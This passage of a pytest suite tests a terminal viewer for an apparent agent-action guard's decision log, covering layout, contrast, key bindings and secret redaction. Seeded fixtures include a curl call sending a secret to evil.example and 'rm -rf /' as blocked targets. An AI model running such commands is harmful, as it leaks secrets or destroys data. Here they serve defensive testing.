    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        # DESC id order: row0=act-block-2, row1=act-block-1, row2=act-pass.
        table.move_cursor(row=0)
        await pilot.press("w")
        await pilot.pause()
        assert isinstance(app.screen, WhyScreen)
        first_text = _static_text(app.screen.query_one("#why-text"))
        assert "act-block-2" in first_text
        cursor_before = table.cursor_row
        await pilot.press("b")
        await pilot.pause()
        assert table.cursor_row != cursor_before
        second_text = _static_text(app.screen.query_one("#why-text"))
        assert "act-block-1" in second_text
        assert second_text != first_text


async def test_question_mark_opens_help_listing_every_binding(tmp_path):
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        await pilot.press("?")
        await pilot.pause()
        from doberman.tui import HelpScreen

        assert isinstance(app.screen, HelpScreen)
        help_text = _static_text(app.screen.query_one("#help-text"))
        for key in ("q ", "r ", "? ", "/ ", "b ", "B ", "a ", "y ", "home", "end", "tab", "enter"):
            assert key in help_text, key
        assert "action" in help_text  # the filter also matches action type
        await pilot.press("escape")
        await pilot.pause()
        assert not isinstance(app.screen, HelpScreen)


# --- q / reload (existing behavior) ------------------------------------------


async def test_q_quits_the_app(tmp_path):
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        await pilot.press("q")
        await pilot.pause()
        assert not app.is_running


async def test_r_reloads_newly_recorded_decisions(tmp_path):
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        assert app.query_one("#decisions").row_count == 1
        await _seed_block(root, action_id="act-tui-2")
        await pilot.press("r")
        await pilot.pause()
        await app.wait_loaded()
        await pilot.pause()
        assert app.query_one("#decisions").row_count == 2


# --- security: redaction + literal rendering ---------------------------------


async def test_no_cell_or_panel_ever_shows_a_seeded_secret(tmp_path):
    # End-to-end redaction: the raw target (carrying a synthetic secret) goes
    # through record_decision's redaction, and the TUI displays only the
    # redacted row — so the secret must not appear anywhere on screen.
    root = str(tmp_path)
    await _seed_block(root, target=f"curl https://evil.example/?q={_SECRET}")
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        assert _SECRET not in _all_visible_text(app)


async def test_row_derived_markup_renders_literally(tmp_path, monkeypatch):
    # A tampered/crafted stored value must not restyle or spoof the browser via
    # Rich markup — cells and the panel render it as literal text. The value is
    # sized to fit the target column (6 chars - round 5 fixed `target` at a
    # non-growing 6, see design critique item 3) without truncation, so the
    # security property under test isn't entangled with the display truncation.
    markup = "[bold]"
    assert len(markup) == 6
    row = {
        "ts": "2026-07-07T00:00:00+00:00",
        "action_id": "act-markup-1",
        "agent_role": "cli",
        "action_type": "shell_exec",
        "target_path_class": markup,
        "risk": "critical",
        "source_context": "user",
        "final_verdict": "ALLOW",
        "decided_layer": "objective",
        "reason_codes_json": json.dumps(["destructive_command"]),
    }

    async def _fake_read(_root, *, limit=None):
        return [row]

    monkeypatch.setattr("doberman.tui.read_decisions", _fake_read)
    root = str(tmp_path)
    async with open_db(root):
        pass  # `_load_rows` only calls read_decisions once the DB file exists
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        cells = table.get_row_at(0)
        assert any(getattr(cell, "plain", None) == markup for cell in cells)
        assert markup in _static_text(app.query_one("#explanation"))


# --- ASCII-only ----------------------------------------------------------


async def test_all_rendered_content_is_ascii_only(tmp_path):
    root = str(tmp_path)
    await _seed(root, action_id="act-1", verdict=Verdict.BLOCK)
    await _seed(
        root, action_id="act-2", verdict=Verdict.AUTH, reason_codes=[ReasonCode.unknown_tool]
    )
    await _seed(root, action_id="act-3", verdict=Verdict.PASS, reason_codes=[])
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        assert _all_visible_text(app).isascii()
        assert _static_text(app.query_one("#date-bar")).isascii()
        await pilot.press("?")
        await pilot.pause()
        assert _static_text(app.screen.query_one("#help-text")).isascii()
        await pilot.press("escape")
        await pilot.pause()
        await pilot.press("enter")
        await pilot.pause()
        assert _static_text(app.screen.query_one("#why-text")).isascii()


# --- 80x24: nothing important is unreachable ---------------------------------


async def test_80x24_no_horizontal_scroll_and_why_panel_scrolls_and_reaches_full_text(tmp_path):
    root = str(tmp_path)
    long_target = "/very/deeply/nested/path/that/is/long/target.py"
    await _seed(
        root,
        action_id="act-narrow",
        target=long_target,
        verdict=Verdict.BLOCK,
        reason_codes=[
            ReasonCode.destructive_command,
            ReasonCode.bulk_operation,
            ReasonCode.sensitive_path_access,
        ],
    )
    app = DecisionExplainerApp(root)
    async with app.run_test(size=(80, 24)) as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        # No horizontal scroll needed: the table's content never exceeds the
        # viewport width at 80 columns.
        assert table.virtual_size.width <= table.size.width
        # The table's own "why" cell may be shortened, but the full reason
        # codes are always reachable via the full-screen why view.
        await pilot.press("enter")
        await pilot.pause()
        full_text = _static_text(app.screen.query_one("#why-text"))
        assert "destructive_command" in full_text
        assert "bulk_operation" in full_text
        assert "sensitive_path_access" in full_text
        # And the why screen itself scrolls rather than clipping.
        scroll = app.screen.query_one("#why-scroll")
        assert scroll.can_focus


async def test_explanation_panel_is_focusable_and_scrollable(tmp_path):
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        scroll = app.query_one("#explanation-scroll")
        assert scroll.can_focus


# --- cursor gutter --------------------------------------------------------


async def test_cursor_gutter_marks_exactly_one_row(tmp_path):
    # round 3 design critique item 2: the dark cursor row alone measured
    # 1.69:1 contrast - an ASCII ">" gutter cell makes the selection legible
    # without relying on color at all.
    root = str(tmp_path)
    for i in range(4):
        await _seed(root, action_id=f"act-{i}", verdict=Verdict.PASS, reason_codes=[])
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")

        def _gutter_marks() -> list[int]:
            return [i for i in range(table.row_count) if table.get_row_at(i)[0].plain == ">"]

        assert _gutter_marks() == [0]
        # round 5 design critique item 11: poll - `on_data_table_row_highlighted`
        # -> `_show_explanation` -> `_update_gutter` can legitimately land a
        # tick late under load, same race class as the two named tests.
        table.move_cursor(row=2)
        assert await _wait_for(pilot, _gutter_marks, lambda marks: marks == [2]) == [2]
        table.move_cursor(row=3)
        assert await _wait_for(pilot, _gutter_marks, lambda marks: marks == [3]) == [3]


# --- docked "Next" line ----------------------------------------------------


async def test_next_line_is_docked_and_on_screen_at_80x24(tmp_path):
    # round 3 design critique item 3: "Next:" must stay visible even when the
    # why panel above it is small - checked here by asserting the widget's own
    # laid-out region falls entirely inside the 80x24 screen.
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test(size=(80, 24)) as pilot:
        await _wait_loaded(pilot, app)
        next_line = app.query_one("#next-line")
        text = _static_text(next_line)
        assert text.startswith("Next:")
        assert "doberman mode" in text
        assert "doberman review --yes" in text
        assert text.endswith("press w for detail")
        region = next_line.region
        assert region.width > 0
        assert region.height > 0
        assert region.y >= 0
        assert region.y + region.height <= app.size.height
        # round 4 design critique item 1: a fixed `height: 1` used to clip the
        # rendered box to one line even though the underlying text (checked
        # above) was never truncated - only the RENDER was. Wrapping onto more
        # than one line, and the tail of the text actually reaching the
        # screen, is what a `height: 1` box would have hidden.
        assert region.height >= 2
        svg = app.export_screenshot()
        assert "review&#160;--yes" in svg  # mid-text: would be cut by a 1-line box
        assert "press&#160;w&#160;for&#160;detail" in svg  # the very tail


# --- multi-day logs ---------------------------------------------------------


async def test_time_cell_shows_month_day_when_rows_span_multiple_days(tmp_path, monkeypatch):
    # round 3 design critique item 6: a log spanning more than one calendar
    # day trades HH:MM:SS for a date-qualified MM-DD HH:MM. Hand-built rows
    # (like `test_row_derived_markup_renders_literally`): `build_record`
    # stamps `ts` with the real wall clock, so `_seed`'s `ts` parameter can't
    # actually control which calendar day a real row lands on.
    def _row(action_id: str, ts: str) -> dict:
        return {
            "ts": ts,
            "action_id": action_id,
            "agent_role": "cli",
            "action_type": "shell_exec",
            "target_path_class": None,
            "risk": "low",
            "source_context": "user",
            "final_verdict": "PASS",
            "decided_layer": "objective",
            "reason_codes_json": json.dumps([]),
        }

    rows = [
        _row("act-day1", "2026-07-07T08:00:00+00:00"),
        _row("act-day2", "2026-07-08T09:30:00+00:00"),
    ]

    async def _fake_read(_root, *, limit=None):
        return rows

    monkeypatch.setattr("doberman.tui.read_decisions", _fake_read)
    root = str(tmp_path)
    async with open_db(root):
        pass
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        assert table.row_count == 2
        for row_index in range(2):
            time_cell = table.get_row_at(row_index)[2]
            assert re.fullmatch(r"\d{2}-\d{2} \d{2}:\d{2}", time_cell.plain), time_cell.plain
        assert table.get_row_at(0)[2].plain == "07-07 08:00"
        assert table.get_row_at(1)[2].plain == "07-08 09:30"


async def test_single_day_log_keeps_hhmmss_time_cell(tmp_path):
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        time_cell = table.get_row_at(0)[2]
        assert re.fullmatch(r"\d{2}:\d{2}:\d{2}", time_cell.plain), time_cell.plain


# --- column widths: `why` keeps a usable floor at 80 columns ----------------


def test_widths_for_80_columns_keeps_why_at_least_14_wide_single_day():
    # round 4 design critique items 2 + 11: `why` measured only 5 columns at
    # 80 terminal columns even on a SINGLE-day log (80 columns left zero
    # spare to distribute) - the room must come from auth/action/target,
    # never from why. Round 5 item 3 raises the floor further: `target` is
    # now a fixed 6 that never grows, so ALL spare width goes to `why`.
    widths = _widths_for(80, multi_day=False)
    assert widths["target"] == 6
    assert widths["why"] >= 14
    total = sum(widths.values()) + 2 * len(widths)  # + cell padding
    assert total + 2 + 1 <= 80  # + border columns + the 1-column buffer


def test_widths_for_80_columns_keeps_why_at_least_14_wide_multi_day():
    # Same floor, but on a multi-day log where `time` also widens to fit
    # "MM-DD HH:MM" - that extra width must come from `target`, never `why`.
    widths = _widths_for(80, multi_day=True)
    assert widths["why"] >= 14
    assert widths["time"] == 11
    total = sum(widths.values()) + 2 * len(widths)
    assert total + 2 + 1 <= 80


def test_widths_for_hides_target_and_gives_its_reclaimed_width_to_why():
    # round 5 design critique item 3: when every loaded row's target is
    # missing, the column drops out entirely and `why` gets its width (and
    # the freed cell padding) back too - not just the ordinary spare room.
    shown = _widths_for(80, hide_target=False)
    hidden = _widths_for(80, hide_target=True)
    assert "target" in shown
    assert "target" not in hidden
    assert hidden["why"] > shown["why"]
    total = sum(hidden.values()) + 2 * len(hidden)
    assert total + 2 + 1 <= 80


def test_all_targets_missing_true_only_when_every_row_lacks_one():
    assert _all_targets_missing([]) is False  # nothing loaded yet - stay visible
    assert _all_targets_missing([{"target_path_class": None}, {"target_path_class": ""}]) is True
    assert (
        _all_targets_missing([{"target_path_class": None}, {"target_path_class": "a/*.py"}])
        is False
    )


async def test_target_column_is_hidden_when_every_row_lacks_a_target_path_class(tmp_path):
    # round 5 design critique item 3: a real shell_exec row never gets a
    # `target_path_class` - the column is pure dead weight there, so it drops
    # out of the table entirely and `why` absorbs its width.
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        assert "target" not in app._headers
        table = app.query_one("#decisions")
        labels = [str(col.label) for col in table.columns.values()]
        assert "target" not in labels
        assert len(table.get_row_at(0)) == len(app._headers)


async def test_target_column_stays_when_at_least_one_row_has_a_real_target(tmp_path, monkeypatch):
    root = str(tmp_path)

    def _row(action_id: str, target_path_class: str | None, action_type: str) -> dict:
        return {
            "ts": "2026-07-07T00:00:00+00:00",
            "action_id": action_id,
            "agent_role": "cli",
            "action_type": action_type,
            "target_path_class": target_path_class,
            "risk": "high",
            "source_context": "user",
            "final_verdict": "BLOCK",
            "decided_layer": "objective",
            "reason_codes_json": json.dumps(["sensitive_path_access"]),
        }

    rows = [
        _row("act-file", "backend/secrets/*.env", "file_read"),
        _row("act-shell", None, "shell_exec"),
    ]

    async def _fake_read(_root, *, limit=None):
        return rows

    monkeypatch.setattr("doberman.tui.read_decisions", _fake_read)
    async with open_db(root):
        pass  # `_load_rows` only calls read_decisions once the DB file exists
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        assert "target" in app._headers
        table = app.query_one("#decisions")
        labels = [str(col.label) for col in table.columns.values()]
        assert "target" in labels


# --- reason codes read as words in the why column ---------------------------


async def test_why_column_shows_reason_codes_as_short_words_not_raw_codes(tmp_path):
    # round 3 design critique item 7: the table's "why" column reads as words
    # (a short label if one exists, else the code with underscores replaced by
    # spaces) - the full raw codes still show in the why panel/full-screen why.
    root = str(tmp_path)
    await _seed(
        root,
        action_id="act-words",
        verdict=Verdict.BLOCK,
        reason_codes=[ReasonCode.secret_exfiltration, ReasonCode.destructive_command],
    )
    app = DecisionExplainerApp(root)
    async with app.run_test(size=(160, 30)) as pilot:  # wide: the why cell isn't truncated
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        # `_seed`'s row is a shell_exec action (no `target_path_class`), so
        # round 5's target-hiding (design critique item 3) drops that column
        # here - look the "why" cell up by its tracked header index rather
        # than a hardcoded position.
        why_cell = table.get_row_at(0)[app._headers.index("why")]
        assert why_cell.plain == "secret sent outbound, destructive command"
        assert "_" not in why_cell.plain
        # The full-screen why keeps the raw codes verbatim.
        await pilot.press("w")
        await pilot.pause()
        full_text = _static_text(app.screen.query_one("#why-text"))
        assert "secret_exfiltration" in full_text
        assert "destructive_command" in full_text


# --- resize keeps the selection ------------------------------------------


async def test_resize_preserves_the_selected_row(tmp_path):
    # design critique item 10: `_rebuild_table` must restore the previously
    # selected row (by key), never snap back to row 0.
    root = str(tmp_path)
    for i in range(5):
        await _seed(root, action_id=f"act-{i}", verdict=Verdict.PASS, reason_codes=[])
    app = DecisionExplainerApp(root)
    async with app.run_test(size=(100, 30)) as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        table.move_cursor(row=3)
        selected_id = app._visible_rows[3]["action_id"]
        assert app._visible_rows[0]["action_id"] != selected_id  # sanity: not already row 0
        await pilot.resize_terminal(70, 24)
        await pilot.pause()
        assert app._visible_rows[table.cursor_row]["action_id"] == selected_id


# --- footer legibility at narrow/wide terminals ---------------------------


async def test_footer_at_80_columns_shows_the_most_important_bindings(tmp_path):
    # design critique item 1: ordered by importance so a narrow footer still
    # reads useful bindings rather than truncating mid-list.
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test(size=(80, 24)) as pilot:
        await _wait_loaded(pilot, app)
        # round 4: the footer only recomposes after `refresh_bindings()` once
        # Textual's own deferred `call_after_refresh` runs - poll rather than
        # trust a single `pilot.pause()`, which can legitimately race it.
        text = await _wait_for_footer_text(
            pilot, app, lambda t: t.startswith("w why  / filter  b next BLOCK  ? help  q quit")
        )
        assert text.startswith("w why  / filter  b next BLOCK  ? help  q quit")


async def test_footer_at_120_columns_shows_every_binding(tmp_path):
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    expected = (
        "w why  / filter  b next BLOCK  ? help  q quit  B prev BLOCK  "
        "a next AUTH  y copy id  r reload"
    )
    async with app.run_test(size=(120, 40)) as pilot:
        await _wait_loaded(pilot, app)
        text = await _wait_for_footer_text(pilot, app, lambda t: t == expected)
        assert text == expected


# --- contrast: BLOCK/AUTH chip meets the WCAG floor -----------------------


async def test_block_and_auth_chip_meet_the_contrast_floor_in_both_cursor_states(tmp_path):
    # design critique item 14: measured evidence was plain-foreground bright_red
    # at 3.57:1 (2.90:1 under the cursor) - both below 4.5:1. The chip style
    # (solid background + pure-black text) must clear 4.5:1 whether or not the
    # cell is under the cursor (cursor_background_priority="renderable" keeps
    # the chip's own background instead of the cursor highlight overriding it).
    import pathlib

    root = str(tmp_path)
    await _seed(root, action_id="act-block-1", verdict=Verdict.BLOCK)
    await _seed(root, action_id="act-block-2", verdict=Verdict.BLOCK, target="rm -rf /tmp")
    await _seed(
        root,
        action_id="act-auth-1",
        verdict=Verdict.AUTH,
        reason_codes=[ReasonCode.unknown_external_destination],
        target="curl https://example.com",
    )
    # round 4 design critique items 5 + 10: medium risk is now a chip too -
    # plain foreground text measured only 4.06:1 under the cursor row.
    await _seed(
        root,
        action_id="act-medium-1",
        verdict=Verdict.PASS,
        risk=Risk.medium,
        reason_codes=[],
        target="README.md",
    )
    app = DecisionExplainerApp(root)
    async with app.run_test(size=(100, 24)) as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        # DESC id order: row0=act-medium-1, row1=act-auth-1, row2=act-block-2,
        # row3=act-block-1. Land the cursor on a BLOCK row first.
        table.move_cursor(row=2)
        await pilot.pause()
        svg = app.export_screenshot()
        out_dir = pathlib.Path(__file__).resolve().parents[2] / "test-logs"
        out_dir.mkdir(parents=True, exist_ok=True)
        (out_dir / "tui-chip-contrast-100x24.svg").write_text(svg, encoding="utf-8")

        block_cells = _svg_cell_colors(svg, "X BLOCK")
        assert len(block_cells) == 2  # both BLOCK rows - one is the cursor row, one isn't
        for text_hex, bg_hex in block_cells:
            ratio = _wcag_contrast_ratio(text_hex, bg_hex)
            assert ratio >= 4.5, (text_hex, bg_hex, ratio)

        auth_cells = _svg_cell_colors(svg, "! AUTH")
        assert auth_cells
        for text_hex, bg_hex in auth_cells:
            ratio = _wcag_contrast_ratio(text_hex, bg_hex)
            assert ratio >= 4.5, (text_hex, bg_hex, ratio)

        # medium risk, not under the cursor in this screenshot.
        medium_cells = _svg_cell_colors(svg, "medium")
        assert medium_cells
        for text_hex, bg_hex in medium_cells:
            ratio = _wcag_contrast_ratio(text_hex, bg_hex)
            assert ratio >= 4.5, (text_hex, bg_hex, ratio)

        # And again with the medium-risk row itself under the cursor.
        table.move_cursor(row=0)
        await pilot.pause()
        svg_cursor = app.export_screenshot()
        medium_cursor_cells = _svg_cell_colors(svg_cursor, "medium")
        assert medium_cursor_cells
        for text_hex, bg_hex in medium_cursor_cells:
            ratio = _wcag_contrast_ratio(text_hex, bg_hex)
            assert ratio >= 4.5, (text_hex, bg_hex, ratio)


# --- LLM enrichment failure never strands the panel -----------------------


async def test_explain_worker_exception_falls_back_instead_of_hanging_on_narrating(
    tmp_path, monkeypatch
):
    # design critique item 4: an unhandled raise inside the enrichment call
    # must read exactly like the already-handled "LLM call failed" case, not
    # strand the panel on "narrating..." forever.
    import doberman.tui as tui_mod

    root = str(tmp_path)
    await _seed_block(root)
    monkeypatch.setattr(tui_mod, "llm_enrichment_enabled", lambda: True)

    def _raise(row):
        raise RuntimeError("boom")

    monkeypatch.setattr(tui_mod, "explain_decision_with_source", _raise)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        # round 4 design critique item 12 (CI fix): assert only the TERMINAL
        # state, never the transient "narrating..." one - on a loaded/slow CI
        # runner the debounced worker can already have finished by the time
        # this test's first assertion would have run, making that assertion
        # flaky rather than meaningful.
        await pilot.pause(tui_mod._EXPLAIN_DEBOUNCE_S + 0.2)
        await app.workers.wait_for_complete()
        await pilot.pause()
        text = _static_text(app.query_one("#explanation"))
        assert "narrating" not in text
        assert "LLM unavailable - showing template" in text


# --- reference screenshots for design review ---------------------------------


async def test_export_reference_screenshots(tmp_path):
    """Not an assertion-heavy test: renders a few representative rows and saves
    SVG screenshots for human design review, per this slice's brief. Kept as a
    real (skippable, deterministic) test so the references regenerate whenever
    the TUI changes, rather than a throwaway one-off script.
    """
    import pathlib

    root = str(tmp_path)
    await _seed(root, action_id="act-block", verdict=Verdict.BLOCK, target="rm -rf /")
    await _seed(
        root,
        action_id="act-auth",
        verdict=Verdict.AUTH,
        reason_codes=[ReasonCode.unknown_external_destination],
        target="curl https://example.com",
    )
    await _seed(
        root, action_id="act-pass", verdict=Verdict.PASS, reason_codes=[], target="README.md"
    )

    out_dir = pathlib.Path(__file__).resolve().parents[2] / "test-logs"
    out_dir.mkdir(parents=True, exist_ok=True)

    for width, height in ((120, 40), (80, 24)):
        app = DecisionExplainerApp(root)
        async with app.run_test(size=(width, height)) as pilot:
            await _wait_loaded(pilot, app)
            svg = app.export_screenshot()
            path = out_dir / f"tui-table-{width}x{height}.svg"
            path.write_text(svg, encoding="utf-8")
            assert path.stat().st_size > 0
            if (width, height) == (80, 24):
                await pilot.press("enter")
                await pilot.pause()
                svg_why = app.export_screenshot()
                why_path = out_dir / "tui-why-80x24.svg"
                why_path.write_text(svg_why, encoding="utf-8")
                assert why_path.stat().st_size > 0


# --- round 5: affordance vs. remedy (item 1) ---------------------------------


async def test_press_w_hint_only_on_the_docked_next_line_not_in_the_why_screen(tmp_path):
    # round 5 design critique item 1: "press w for detail" is the AFFORDANCE
    # to open the detail view - the full-screen why IS that detail, so it
    # must never tell the reader to press w again to see itself.
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        next_text = _static_text(app.query_one("#next-line"))
        assert next_text.endswith("press w for detail")
        await pilot.press("w")
        await pilot.pause()
        assert isinstance(app.screen, WhyScreen)
        full_text = _static_text(app.screen.query_one("#why-text"))
        assert "Next:" in full_text
        assert "press w for detail" not in full_text


# --- round 5: 80-column footer fits; low-priority bindings still work (item 2) --


async def test_footer_at_80_columns_fits_and_esc_clear_shows_while_filter_focused(tmp_path):
    from textual.widgets._footer import FooterKey

    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test(size=(80, 24)) as pilot:
        await _wait_loaded(pilot, app)

        def _all_keys_fit() -> bool:
            footer = app.query_one("Footer")
            return all(
                key.region.x + key.region.width <= footer.size.width for key in app.query(FooterKey)
            )

        assert await _wait_for(pilot, _all_keys_fit, lambda ok: ok)
        # The least-important bindings are gone from the footer entirely
        # below 100 columns (see the next test: they still WORK).
        footer_text = await _wait_for_footer_text(
            pilot, app, lambda t: "prev BLOCK" not in t and "copy id" not in t
        )
        for label in ("prev BLOCK", "next AUTH", "copy id", "reload"):
            assert label not in footer_text, label

        await pilot.press("/")
        footer_text = await _wait_for_footer_text(pilot, app, lambda t: "clear" in t)
        assert "clear" in footer_text
        assert await _wait_for(pilot, _all_keys_fit, lambda ok: ok)


async def test_low_priority_bindings_still_work_when_hidden_at_80_columns(tmp_path):
    # round 5 design critique item 2: hidden from the footer != disabled.
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test(size=(80, 24)) as pilot:
        await _wait_loaded(pilot, app)
        footer_text = await _wait_for_footer_text(pilot, app, lambda t: "reload" not in t)
        assert "reload" not in footer_text
        await _seed_block(root, action_id="act-tui-2")
        await pilot.press("r")  # "reload" - hidden from the footer, still bound
        await pilot.pause()
        await app.wait_loaded()
        await pilot.pause()
        assert app.query_one("#decisions").row_count == 2


# --- round 5: help is a real modal (item 4) -----------------------------------


async def test_help_never_stacks_and_other_keys_are_inert_while_it_is_open(tmp_path):
    from doberman.tui import HelpScreen

    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        await pilot.press("?")
        await pilot.pause()
        assert isinstance(app.screen, HelpScreen)
        stack_depth = len(app.screen_stack)
        await pilot.press("?")  # a second ? must not push a second HelpScreen
        await pilot.pause()
        assert len(app.screen_stack) == stack_depth
        assert isinstance(app.screen, HelpScreen)
        await pilot.press("w")  # `w` must not open WhyScreen over help
        await pilot.pause()
        assert isinstance(app.screen, HelpScreen)
        await pilot.press("escape")
        await pilot.pause()
        assert not isinstance(app.screen, HelpScreen)


# --- round 5: help fits or scrolls with an earned cue (item 5) ----------------


async def test_help_screen_earns_its_scroll_cue_only_when_the_body_overflows(tmp_path):
    root = str(tmp_path)
    await _seed_block(root)
    short_app = DecisionExplainerApp(root)
    async with short_app.run_test(size=(80, 12)) as pilot:
        await _wait_loaded(pilot, short_app)
        await pilot.press("?")
        await pilot.pause()
        help_text = _static_text(short_app.screen.query_one("#help-text"))
        assert help_text.endswith("(scroll for more)")
        for line in help_text.splitlines():
            assert len(line) <= 76, line

    tall_app = DecisionExplainerApp(root)
    async with tall_app.run_test(size=(80, 40)) as pilot:
        await _wait_loaded(pilot, tall_app)
        await pilot.press("?")
        await pilot.pause()
        help_text = _static_text(tall_app.screen.query_one("#help-text"))
        assert "(scroll for more)" not in help_text


# --- round 5: panel hierarchy - explanation first, muted provenance last (item 6) --


async def test_panel_leads_with_the_explanation_and_ends_with_a_muted_provenance_line(tmp_path):
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        panel = app.query_one("#explanation")
        text = panel.content
        assert isinstance(text, Text)
        plain = str(text)
        lines = plain.splitlines()
        assert lines[0] != "source: offline template"
        assert lines[-1] == "source: offline template"
        provenance_start = len(plain) - len("source: offline template")
        assert any(
            span.start == provenance_start and span.end == len(plain) and span.style == "dim"
            for span in text.spans
        )


async def test_next_line_bolds_the_next_prefix_in_the_auth_accent_style(tmp_path):
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        widget = app.query_one("#next-line")
        text = widget.content
        assert isinstance(text, Text)
        plain = str(text)
        assert plain.startswith("Next")
        expected_style = render.verdict_rich_style(Verdict.AUTH)
        assert any(
            span.start == 0 and span.end == len("Next") and span.style == expected_style
            for span in text.spans
        )


# --- round 5: a pending AUTH row is not "nothing" (item 7) --------------------


async def test_pending_auth_row_shows_pending_not_a_dash(tmp_path):
    root = str(tmp_path)
    await _seed(
        root,
        action_id="act-pending-auth",
        verdict=Verdict.AUTH,
        reason_codes=[ReasonCode.unknown_tool],
        auth_result=None,
    )
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        auth_cell = table.get_row_at(0)[4]
        assert auth_cell.plain == "pending"


# --- round 5: focus has a second, non-color cue (item 8) ---------------------


async def test_focused_pane_gets_a_focus_border_title(tmp_path):
    # round 5 design critique item 8: a second, non-color focus cue. Note:
    # `border_title`'s getter returns its own escaped console-markup form
    # (a literal "[" round-trips as "\[") - assert on content, not the exact
    # escape representation, which is a Textual implementation detail.
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        panel = app.query_one("#explanation-scroll")
        assert table.border_title and "focus" in table.border_title.lower()
        assert not panel.border_title
        await pilot.press("tab")
        await pilot.pause()
        assert panel.border_title and "focus" in panel.border_title.lower()
        assert not table.border_title


# --- round 5: empty state is honest about keys (item 9) -----------------------


async def test_empty_state_hides_the_date_bar_legend_and_the_filter_footer_entry(tmp_path):
    root = str(tmp_path)
    async with open_db(root):
        pass  # a real, empty decision log - nothing to filter
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        assert _static_text(app.query_one("#date-bar")) == ""
        assert app.check_action("filter", ()) is False
        footer_text = await _wait_for_footer_text(pilot, app, lambda t: "filter" not in t)
        assert "filter" not in footer_text


async def test_filtered_to_zero_still_shows_the_legend_and_the_filter_entry(tmp_path):
    # Contrast: filtering EXISTING data to zero matches is not the same as
    # having no data at all - the legend and the filter entry stay.
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        assert app.check_action("filter", ()) is True
        filter_input = app.query_one("#filter")
        filter_input.display = True
        filter_input.value = "no-such-substring-anywhere"
        await _wait_for(pilot, lambda: app._visible_rows, lambda rows: rows == [])
        assert app.check_action("filter", ()) is True
        assert _static_text(app.query_one("#date-bar")) != ""


# --- round 5: minimum terminal size notice (item 10) --------------------------


async def test_terminal_too_small_shows_one_line_notice_instead_of_the_browser(tmp_path):
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test(size=(50, 10)) as pilot:
        await _wait_loaded(pilot, app)
        assert app.query_one("#too-small").display is True
        assert app.query_one("#body").display is False
        assert (
            _static_text(app.query_one("#too-small"))
            == "Terminal too small - resize to at least 60x12"
        )


async def test_normal_size_never_shows_the_too_small_notice(tmp_path):
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test(size=(80, 24)) as pilot:
        await _wait_loaded(pilot, app)
        assert app.query_one("#too-small").display is False
        assert app.query_one("#body").display is True
